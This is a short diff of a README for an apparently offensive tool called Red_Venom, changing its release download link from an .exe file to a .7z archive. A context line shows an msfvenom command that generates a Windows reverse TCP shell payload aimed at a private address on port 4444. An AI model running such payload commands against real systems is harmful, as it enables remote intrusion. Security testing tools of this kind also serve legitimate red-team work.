@@ -118,7 +118,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUN
 
 You can download the latest official release of **RED_VENOM** from the link below:
 
-🔗 [**Download Red_Venom (Latest Version)**](https://github.com/Y-JANBOUBI/Rrd_Venom/releases/download/v1.0/Red_Venom.exe)
+🔗 [**Download Red_Venom (Latest Version)**](https://github.com/Y-JANBOUBI/Rrd_Venom/releases/download/v1.0/Red_Venom.7z)
 
 ---
 
